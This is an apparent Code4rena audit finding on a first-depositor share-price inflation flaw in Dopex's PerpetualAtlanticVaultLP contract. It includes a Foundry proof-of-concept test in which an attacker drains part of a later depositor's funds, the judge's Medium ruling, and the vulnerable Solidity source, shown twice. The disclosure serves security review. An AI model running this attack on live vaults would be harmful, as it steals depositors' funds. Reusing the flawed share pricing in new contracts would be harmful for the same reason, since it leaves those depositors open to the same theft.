{
  "Title": "[M-09]  A malicious early depositor can manipulate the `LP-Token` price per share to take an unfair share of future user deposits",
  "Content": "\n<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118> \n\n<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L283>\n\nA  malicious early depositor can profit from future depositors' deposits. While the late depositors will lose part of their funds to the attacker.\n\n### Vulnerability Details\n\nThe first depositor can buy a small number of shares and next he should wait until   owner  settle an options through `RdpxCore` so it will result in calling `addRDPX` in `PerpetualAtlanticVaultLP` by transfering rdpxTokens into it and updating `_rdpxCollateral`, as `rdpx Token` has 18 decimals `https://arbiscan.io/token/0x32eb7902d4134bf98a28b963d26de779af92a212` even small amount of rdpx token result in giving a higher `totalVaultCollateral()` so then it calculates `assets.mulDivDown(supply,totalVaultCollateral);` , then it  will make shares very expensive for the next depositors,\n\n### POC\n\n`copy this test into  /tests/perp-vault/Integration.t.sol`<br>\n`forge test --match-path  ./tests/perp-vault/Integration.t.sol   -vvvv`\n\n```js\n function test_second_user_loss_share() external {\n  //=============================\n  address  hecer  = makeAddr(\"Hecer\");\n  address  investor = makeAddr(\"investor\");\n  //=============================\n\n setApprovals(hecer);\n setApprovals(investor);\n\n    mintWeth(1 wei, hecer); // hecker starts with 1 wei ðŸ±â€ðŸ‘¤\n    mintWeth(20 ether, investor);\n \n \n console.log(\"WETH Balance Of attacker before \" , weth.balanceOf(hecer));          \n   console.log(\"RDPX Balance Of attacker before \" ,rdpx.balanceOf(hecer));\n    deposit(1 wei, hecer);\n\n    //===============================================================================================================\n    /* This step isn't possible like this owner should call  `settle` in RdpxV2Core , but for the simplicity lets say\n        10 rdpx tokens transfered into vaultLP   after hecer deposit 1 wei of weth and get 1 share \n    */ \n    deal(address(rdpx),address(vaultLp),10 ether);  // 10 tokens because rpdx 18 decimals // 0x32eb7902d4134bf98a28b963d26de779af92a212 \n    vm.prank(address(vault));\n    vaultLp.addRdpx(10 ether);\n//===============================================================================================================\n//   Then the investor deposits  20 ether \n    deposit(20 ether, investor);\n    \n    uint256 userBalance = vaultLp.balanceOf(hecer);\n    uint256 userBalance2 = vaultLp.balanceOf(investor);\n    console.log(\"Lp-balance Of attacker : %s share \" , userBalance);\n    console.log(\"Lp-balance Of investor : %s share \" , userBalance2);\n          // (uint asset , uint rdpxA)= vaultLp.redeemPreview(uint256(1));\n    vm.prank(hecer);\n    vaultLp.redeem(uint256(1),hecer,hecer);\n\n   console.log(\"WETH Balance Of attacker after\" , weth.balanceOf(hecer));  //Starting with 1wei attackerðŸ±â€ðŸ‘¤ endUp with 2 wrapped ether ;    \n   console.log(\"RDPX Balance Of attacker after\" ,rdpx.balanceOf(hecer));        \n  }\n\n```\n\n### Tools used\n\n Foundry\n\n### Recommendation\n\nConsider requiring a minimal amount of share tokens to be minted for the first minter\n\n**[witherblock (Dopex) acknowledged and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1734043995):**\n > We have planned to be the first depositors for this vault to prevent this issue.\n\n**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1759179100):**\n > Given the fact that:\n> - Rebase is possible (good old ERC4626 attack)\n> - Impact is existant\n> - Deployment is Permissioned\n> \n> Medium severity seems appropriate.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-08-dopex",
  "Code": [
    {
      "filename": "contracts/perp-vault/PerpetualAtlanticVaultLP.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.19;\n\n// Contracts\nimport { ERC20 } from \"solmate/src/tokens/ERC20.sol\";\nimport { FixedPointMathLib } from \"solmate/src/utils/FixedPointMathLib.sol\";\nimport { IERC20WithBurn } from \"../interfaces/IERC20WithBurn.sol\";\n\n// Libraries\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { SafeTransferLib } from \"solmate/src/utils/SafeTransferLib.sol\";\n\n// Interfaces\nimport { IPerpetualAtlanticVault } from \"./IPerpetualAtlanticVault.sol\";\nimport { IPerpetualAtlanticVaultLP } from \"./IPerpetualAtlanticVaultLP.sol\";\n\n/**\n * @title PerpetaulAtlanticVault LP Token\n */\ncontract PerpetualAtlanticVaultLP is ERC20, IPerpetualAtlanticVaultLP {\n  using SafeERC20 for IERC20WithBurn;\n  using SafeTransferLib for ERC20;\n  using FixedPointMathLib for uint256;\n\n  // ================================ EVENTS ================================ //\n\n  event Deposit(\n    address indexed caller,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n  );\n\n  event Withdraw(\n    address indexed caller,\n    address indexed receiver,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n  );\n\n  // ================================ STATE VARIABLES ================================ //\n\n  /// @dev The address of the perpetual Atlantic Vault contract creating the lp token\n  IPerpetualAtlanticVault public perpetualAtlanticVault;\n\n  /// @dev The collateral token\n  ERC20 public collateral;\n\n  /// @dev The symbol reperesenting the underlying asset of the perpetualatlanticvault lp\n  string public underlyingSymbol;\n\n  /// @dev The symbol representing the collateral token of the perpetualatlanticvault lp\n  string public collateralSymbol;\n\n  /// @dev Total collateral available\n  uint256 private _totalCollateral;\n\n  /// @dev Active collateral\n  uint256 private _activeCollateral;\n\n  /// @dev Total rdpx available\n  uint256 private _rdpxCollateral;\n\n  /// @dev address of rdpx token\n  address public rdpx;\n\n  /// @dev address of the rdpx rdpxV2Core contract\n  address public rdpxRdpxV2Core;\n\n  // ================================ CONSTRUCTOR ================================ //\n\n  /**\n   * @param _perpetualAtlanticVault The address of the perpetual atlantic vault contract creating the lp token\n   * @param _rdpxRdpxV2Core The address of the rdpx rdpxV2Core contract\n   * @param _collateral The address of the collateral asset in the perpetualatlanticvault contract\n   * @param _collateralSymbol The symbol of the collateral asset token\n   * @param _rdpx The address of the rdpx token\n   */\n  constructor(\n    address _perpetualAtlanticVault,\n    address _rdpxRdpxV2Core,\n    address _collateral,\n    address _rdpx,\n    string memory _collateralSymbol\n  )\n    ERC20(\n      \"PerpetualAtlanticVault LP Token\",\n      _collateralSymbol,\n      ERC20(_collateral).decimals()\n    )\n  {\n    require(\n      _perpetualAtlanticVault != address(0) || _rdpx != address(0),\n      \"ZERO_ADDRESS\"\n    );\n    perpetualAtlanticVault = IPerpetualAtlanticVault(_perpetualAtlanticVault);\n    rdpxRdpxV2Core = _rdpxRdpxV2Core;\n    collateralSymbol = _collateralSymbol;\n    rdpx = _rdpx;\n    collateral = ERC20(_collateral);\n\n    symbol = string.concat(_collateralSymbol, \"-LP\");\n\n    collateral.approve(_perpetualAtlanticVault, type(uint256).max);\n    ERC20(rdpx).approve(_perpetualAtlanticVault, type(uint256).max);\n  }\n\n  // ================================ PUBLIC FUNCTIONS ================================ //\n\n  /**\n   * @notice deposit into ERC4626 token\n   * @param assets assets\n   * @param receiver receiver\n   * @return shares shares of LP tokens minted\n   */\n  function deposit(\n    uint256 assets,\n    address receiver\n  ) public virtual returns (uint256 shares) {\n    // Check for rounding error since we round down in previewDeposit.\n    require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n    perpetualAtlanticVault.updateFunding();\n\n    // Need to transfer before minting or ERC777s could reenter.\n    collateral.transferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    _totalCollateral += assets;\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n  }\n\n  /**\n   * @notice redeem ERC4626 token\n   * @param shares shares\n   * @param receiver receiver\n   * @param owner owner\n   * @return assets native tokens to be received\n   * @return rdpxAmount rdpx tokens to be received\n   */\n  function redeem(\n    uint256 shares,\n    address receiver,\n    address owner\n  ) public returns (uint256 assets, uint256 rdpxAmount) {\n    perpetualAtlanticVault.updateFunding();\n\n    if (msg.sender != owner) {\n      uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n      if (allowed != type(uint256).max) {\n        allowance[owner][msg.sender] = allowed - shares;\n      }\n    }\n    (assets, rdpxAmount) = redeemPreview(shares);\n\n    // Check for rounding error since we round down in previewRedeem.\n    require(assets != 0, \"ZERO_ASSETS\");\n\n    _rdpxCollateral -= rdpxAmount;\n\n    beforeWithdraw(assets, shares);\n\n    _burn(owner, shares);\n\n    collateral.transfer(receiver, assets);\n\n    IERC20WithBurn(rdpx).safeTransfer(receiver, rdpxAmount);\n\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n  }\n\n  // ================================ PERP VAULT FUNCTIONS ================================ //\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function lockCollateral(uint256 amount) public onlyPerpVault {\n    _activeCollateral += amount;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function unlockLiquidity(uint256 amount) public onlyPerpVault {\n    _activeCollateral -= amount;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function addProceeds(uint256 proceeds) public onlyPerpVault {\n    require(\n      collateral.balanceOf(address(this)) >= _totalCollateral + proceeds,\n      \"Not enough collateral token was sent\"\n    );\n    _totalCollateral += proceeds;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function subtractLoss(uint256 loss) public onlyPerpVault {\n    require(\n      collateral.balanceOf(address(this)) == _totalCollateral - loss,\n      \"Not enough collateral was sent out\"\n    );\n    _totalCollateral -= loss;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function addRdpx(uint256 amount) public onlyPerpVault {\n    require(\n      IERC20WithBurn(rdpx).balanceOf(address(this)) >= _rdpxCollateral + amount,\n      \"Not enough rdpx token was sent\"\n    );\n    _rdpxCollateral += amount;\n  }\n\n  // ================================ INTERNAL FUNCTUONS ================================ //\n\n  function _convertToAssets(\n    uint256 shares\n  ) internal view virtual returns (uint256 assets, uint256 rdpxAmount) {\n    uint256 supply = totalSupply;\n    return\n      (supply == 0)\n        ? (shares, 0)\n        : (\n          shares.mulDivDown(totalCollateral(), supply),\n          shares.mulDivDown(_rdpxCollateral, supply)\n        );\n  }\n\n  function _beforeTokenTransfer(\n    address from,\n    address,\n    uint256\n  ) internal virtual {}\n\n  // ================================ VIEWS ================================ //\n\n  /// @notice Returns the total active collateral\n  function activeCollateral() public view returns (uint256) {\n    return _activeCollateral;\n  }\n\n  /// @notice Returns the total collateral\n  function totalCollateral() public view returns (uint256) {\n    return _totalCollateral;\n  }\n\n  /// @notice Returns the total rdpx collateral\n  function rdpxCollateral() public view returns (uint256) {\n    return _rdpxCollateral;\n  }\n\n  /// @notice Returns the total available collateral\n  function totalAvailableCollateral() public view returns (uint256) {\n    return _totalCollateral - _activeCollateral;\n  }\n\n  // ================================ PUBLIC VIEW FUNCTIONS ================================ //\n\n  /// @notice Returns the amount of collateral and rdpx per share\n  function redeemPreview(\n    uint256 shares\n  ) public view returns (uint256, uint256) {\n    return _convertToAssets(shares);\n  }\n\n  /// @notice Returns the amount of shares recieved for a given amount of assets\n  function previewDeposit(uint256 assets) public view returns (uint256) {\n    return convertToShares(assets);\n  }\n\n  /// @notice Returns the amount of shares recieved for a given amount of assets\n  function convertToShares(\n    uint256 assets\n  ) public view returns (uint256 shares) {\n    uint256 supply = totalSupply;\n    uint256 rdpxPriceInAlphaToken = perpetualAtlanticVault.getUnderlyingPrice();\n\n    uint256 totalVaultCollateral = totalCollateral() +\n      ((_rdpxCollateral * rdpxPriceInAlphaToken) / 1e8);\n    return\n      supply == 0 ? assets : assets.mulDivDown(supply, totalVaultCollateral);\n  }\n\n  function beforeWithdraw(uint256 assets, uint256 /*shares*/) internal {\n    require(\n      assets <= totalAvailableCollateral(),\n      \"Not enough available assets to satisfy withdrawal\"\n    );\n    _totalCollateral -= assets;\n  }\n\n  // ================================ MODIFIERS ================================ //\n  modifier onlyPerpVault() {\n    require(\n      msg.sender == address(perpetualAtlanticVault),\n      \"Only the perp vault can call this function\"\n    );\n    _;\n  }\n}"
    },
    {
      "filename": "contracts/perp-vault/PerpetualAtlanticVaultLP.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.19;\n\n// Contracts\nimport { ERC20 } from \"solmate/src/tokens/ERC20.sol\";\nimport { FixedPointMathLib } from \"solmate/src/utils/FixedPointMathLib.sol\";\nimport { IERC20WithBurn } from \"../interfaces/IERC20WithBurn.sol\";\n\n// Libraries\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { SafeTransferLib } from \"solmate/src/utils/SafeTransferLib.sol\";\n\n// Interfaces\nimport { IPerpetualAtlanticVault } from \"./IPerpetualAtlanticVault.sol\";\nimport { IPerpetualAtlanticVaultLP } from \"./IPerpetualAtlanticVaultLP.sol\";\n\n/**\n * @title PerpetaulAtlanticVault LP Token\n */\ncontract PerpetualAtlanticVaultLP is ERC20, IPerpetualAtlanticVaultLP {\n  using SafeERC20 for IERC20WithBurn;\n  using SafeTransferLib for ERC20;\n  using FixedPointMathLib for uint256;\n\n  // ================================ EVENTS ================================ //\n\n  event Deposit(\n    address indexed caller,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n  );\n\n  event Withdraw(\n    address indexed caller,\n    address indexed receiver,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n  );\n\n  // ================================ STATE VARIABLES ================================ //\n\n  /// @dev The address of the perpetual Atlantic Vault contract creating the lp token\n  IPerpetualAtlanticVault public perpetualAtlanticVault;\n\n  /// @dev The collateral token\n  ERC20 public collateral;\n\n  /// @dev The symbol reperesenting the underlying asset of the perpetualatlanticvault lp\n  string public underlyingSymbol;\n\n  /// @dev The symbol representing the collateral token of the perpetualatlanticvault lp\n  string public collateralSymbol;\n\n  /// @dev Total collateral available\n  uint256 private _totalCollateral;\n\n  /// @dev Active collateral\n  uint256 private _activeCollateral;\n\n  /// @dev Total rdpx available\n  uint256 private _rdpxCollateral;\n\n  /// @dev address of rdpx token\n  address public rdpx;\n\n  /// @dev address of the rdpx rdpxV2Core contract\n  address public rdpxRdpxV2Core;\n\n  // ================================ CONSTRUCTOR ================================ //\n\n  /**\n   * @param _perpetualAtlanticVault The address of the perpetual atlantic vault contract creating the lp token\n   * @param _rdpxRdpxV2Core The address of the rdpx rdpxV2Core contract\n   * @param _collateral The address of the collateral asset in the perpetualatlanticvault contract\n   * @param _collateralSymbol The symbol of the collateral asset token\n   * @param _rdpx The address of the rdpx token\n   */\n  constructor(\n    address _perpetualAtlanticVault,\n    address _rdpxRdpxV2Core,\n    address _collateral,\n    address _rdpx,\n    string memory _collateralSymbol\n  )\n    ERC20(\n      \"PerpetualAtlanticVault LP Token\",\n      _collateralSymbol,\n      ERC20(_collateral).decimals()\n    )\n  {\n    require(\n      _perpetualAtlanticVault != address(0) || _rdpx != address(0),\n      \"ZERO_ADDRESS\"\n    );\n    perpetualAtlanticVault = IPerpetualAtlanticVault(_perpetualAtlanticVault);\n    rdpxRdpxV2Core = _rdpxRdpxV2Core;\n    collateralSymbol = _collateralSymbol;\n    rdpx = _rdpx;\n    collateral = ERC20(_collateral);\n\n    symbol = string.concat(_collateralSymbol, \"-LP\");\n\n    collateral.approve(_perpetualAtlanticVault, type(uint256).max);\n    ERC20(rdpx).approve(_perpetualAtlanticVault, type(uint256).max);\n  }\n\n  // ================================ PUBLIC FUNCTIONS ================================ //\n\n  /**\n   * @notice deposit into ERC4626 token\n   * @param assets assets\n   * @param receiver receiver\n   * @return shares shares of LP tokens minted\n   */\n  function deposit(\n    uint256 assets,\n    address receiver\n  ) public virtual returns (uint256 shares) {\n    // Check for rounding error since we round down in previewDeposit.\n    require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n    perpetualAtlanticVault.updateFunding();\n\n    // Need to transfer before minting or ERC777s could reenter.\n    collateral.transferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    _totalCollateral += assets;\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n  }\n\n  /**\n   * @notice redeem ERC4626 token\n   * @param shares shares\n   * @param receiver receiver\n   * @param owner owner\n   * @return assets native tokens to be received\n   * @return rdpxAmount rdpx tokens to be received\n   */\n  function redeem(\n    uint256 shares,\n    address receiver,\n    address owner\n  ) public returns (uint256 assets, uint256 rdpxAmount) {\n    perpetualAtlanticVault.updateFunding();\n\n    if (msg.sender != owner) {\n      uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n      if (allowed != type(uint256).max) {\n        allowance[owner][msg.sender] = allowed - shares;\n      }\n    }\n    (assets, rdpxAmount) = redeemPreview(shares);\n\n    // Check for rounding error since we round down in previewRedeem.\n    require(assets != 0, \"ZERO_ASSETS\");\n\n    _rdpxCollateral -= rdpxAmount;\n\n    beforeWithdraw(assets, shares);\n\n    _burn(owner, shares);\n\n    collateral.transfer(receiver, assets);\n\n    IERC20WithBurn(rdpx).safeTransfer(receiver, rdpxAmount);\n\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n  }\n\n  // ================================ PERP VAULT FUNCTIONS ================================ //\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function lockCollateral(uint256 amount) public onlyPerpVault {\n    _activeCollateral += amount;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function unlockLiquidity(uint256 amount) public onlyPerpVault {\n    _activeCollateral -= amount;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function addProceeds(uint256 proceeds) public onlyPerpVault {\n    require(\n      collateral.balanceOf(address(this)) >= _totalCollateral + proceeds,\n      \"Not enough collateral token was sent\"\n    );\n    _totalCollateral += proceeds;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function subtractLoss(uint256 loss) public onlyPerpVault {\n    require(\n      collateral.balanceOf(address(this)) == _totalCollateral - loss,\n      \"Not enough collateral was sent out\"\n    );\n    _totalCollateral -= loss;\n  }\n\n  /// @inheritdoc\tIPerpetualAtlanticVaultLP\n  function addRdpx(uint256 amount) public onlyPerpVault {\n    require(\n      IERC20WithBurn(rdpx).balanceOf(address(this)) >= _rdpxCollateral + amount,\n      \"Not enough rdpx token was sent\"\n    );\n    _rdpxCollateral += amount;\n  }\n\n  // ================================ INTERNAL FUNCTUONS ================================ //\n\n  function _convertToAssets(\n    uint256 shares\n  ) internal view virtual returns (uint256 assets, uint256 rdpxAmount) {\n    uint256 supply = totalSupply;\n    return\n      (supply == 0)\n        ? (shares, 0)\n        : (\n          shares.mulDivDown(totalCollateral(), supply),\n          shares.mulDivDown(_rdpxCollateral, supply)\n        );\n  }\n\n  function _beforeTokenTransfer(\n    address from,\n    address,\n    uint256\n  ) internal virtual {}\n\n  // ================================ VIEWS ================================ //\n\n  /// @notice Returns the total active collateral\n  function activeCollateral() public view returns (uint256) {\n    return _activeCollateral;\n  }\n\n  /// @notice Returns the total collateral\n  function totalCollateral() public view returns (uint256) {\n    return _totalCollateral;\n  }\n\n  /// @notice Returns the total rdpx collateral\n  function rdpxCollateral() public view returns (uint256) {\n    return _rdpxCollateral;\n  }\n\n  /// @notice Returns the total available collateral\n  function totalAvailableCollateral() public view returns (uint256) {\n    return _totalCollateral - _activeCollateral;\n  }\n\n  // ================================ PUBLIC VIEW FUNCTIONS ================================ //\n\n  /// @notice Returns the amount of collateral and rdpx per share\n  function redeemPreview(\n    uint256 shares\n  ) public view returns (uint256, uint256) {\n    return _convertToAssets(shares);\n  }\n\n  /// @notice Returns the amount of shares recieved for a given amount of assets\n  function previewDeposit(uint256 assets) public view returns (uint256) {\n    return convertToShares(assets);\n  }\n\n  /// @notice Returns the amount of shares recieved for a given amount of assets\n  function convertToShares(\n    uint256 assets\n  ) public view returns (uint256 shares) {\n    uint256 supply = totalSupply;\n    uint256 rdpxPriceInAlphaToken = perpetualAtlanticVault.getUnderlyingPrice();\n\n    uint256 totalVaultCollateral = totalCollateral() +\n      ((_rdpxCollateral * rdpxPriceInAlphaToken) / 1e8);\n    return\n      supply == 0 ? assets : assets.mulDivDown(supply, totalVaultCollateral);\n  }\n\n  function beforeWithdraw(uint256 assets, uint256 /*shares*/) internal {\n    require(\n      assets <= totalAvailableCollateral(),\n      \"Not enough available assets to satisfy withdrawal\"\n    );\n    _totalCollateral -= assets;\n  }\n\n  // ================================ MODIFIERS ================================ //\n  modifier onlyPerpVault() {\n    require(\n      msg.sender == address(perpetualAtlanticVault),\n      \"Only the perp vault can call this function\"\n    );\n    _;\n  }\n}"
    }
  ]
}